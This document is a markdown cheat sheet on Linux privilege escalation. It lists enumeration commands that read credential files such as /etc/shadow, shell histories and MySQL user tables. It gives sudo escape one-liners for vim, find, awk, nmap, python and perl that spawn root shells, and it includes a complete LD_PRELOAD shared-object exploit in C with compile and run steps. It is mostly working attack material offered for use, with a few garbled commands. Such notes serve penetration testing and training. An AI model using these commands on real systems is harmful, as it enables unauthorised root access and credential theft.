# Linux Privilege Escalation

## Information Gathering

Key information

* OS release
* Kernel Version
* Available users and current user privileges
* SUID files
* View the installed packages to check for outdated versions

## OS Version

OS release:

`lsb_release -a`

Kernel version

`uname -a`

Is there a printer?

`lpstat -a`

## Application & Services

```text
ps -aux
ps -ef
top
cat /etc/service
```

a = show processes for all users

u = display the process's user/owner

x = also show processes not attached to a terminal

### Determine which services are running as root

```text
ps aux | grep root
ps -ef | grep root
```

### Determine what applications are installed and their version

```text
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
yum list | grep installed
```

### Determine versions of important applications

```text
gcc -v
mysql --version
java -version
python --version
ruby -v
perl -v
```

### Review system configurations

Syslog Configuration:

`cat /etc/syslog.conf`

Web Server Configurations:

```text
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/apache2/apache2.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
```

PHP Configuration:

`/etc/php5/apache2/php.ini`

Printer \(cupsd\) Configuration:

`cat /etc/cups/cupsd.conf`

MySQL Configuration:

`cat /etc/my.conf`

Inetd Configuration:

`cat /etc/inetd.conf`

List All

`ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'`

### Determine scheduled jobs

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

## Communications and Networking

## Confidential Information & Users

### Identify current user and users in the system

```text
id
who
w
last 
cat /etc/passwd | cut -d :  -f 1  # List users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
```

## Sudo

### Detection

Show which commands sudo allows you to run

`sudo -l`

Sample output:

```text
andrea@viserion:~$ sudo -l
Matching Defaults entries for andrea on viserion:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User andrea may run the following commands on viserion:
 (root) NOPASSWD: /usr/bin/find
 (root) NOPASSWD: /usr/bin/vim
 (root) NOPASSWD: /usr/bin/awk

```

If output is:

\[user\] ALL=(ALL:ALL) ALL

or

(root) ALL

Can escalate privilege directly

```text
sudo su
```

### Exploit

#### FTP

```text
sudo ftp
!/bin/bash
```

#### vi/vim

```text
sudo vim -c '!sh'
```

#### nano
```text
sudo nano -S /bin/bash
```

#### find

```text
sudo find /etc/passwd -exec /bin/sh \;
```

#### awk
```text
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### less/more/man

```text
sudo less /etc/hosts
or
sudo more /etc/hosts
or
sudo man ls
```

Then type !/bin/bash and hit enter

#### nmap
```text
 echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

### python
```text
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

### perl
```text
sudo perl -e 'exec "/bin/bash";'
```

## Sudo (LD_PRELOAD)

### Detection

```text
user@debian:~$ sudo -l 
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
```

### Exploit

1. Write the following C code with any text editor in a writable directory

```text
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

2. Compile and make a shared object file (.so)

```text
gcc -fPIC -shared -o evil.so evil.c -nostartfiles
```

3. Run
```text
sudo LD_PRELOAD=evil.so <COMMAND>
```

### List Sudoers

`cat /etc/sudoers`

### Attempt to display sensitive files

```text
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

### Check for anything interesting in home directories

```text
ls -ahlR /root/
ls -ahlR /home/
```

### Check for hardcoded passwords in scripts, databases or configuration files

```text
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg
```

\*\*Dump all Local, LDAP, NIS, etc password hashes

`getent passwd`

### Check user history for credentials and activity

```text
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history 
cat ~/.php_history
```

### Check user profile and mail

```text
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

### Check for mail aliases or all aliases

```text
cat /etc/aliases
getent aliases
```

## Direction on Privilege Escalation

* Exploit against system
* Exploit against services
* Brute force credentials

SUID files

```text
find / -perm -u=s -type f 2>/dev/null
```

Check program version

```text
[/usr/local/bin/nmap --version]
```

Pop a shell

```text
!sh
```

## Create an exploit file

```text
touch exploit.c vim exploit.c
```

Compile

```text
gcc exploit.c -o exploit
```

Run

```text
./exploit
```

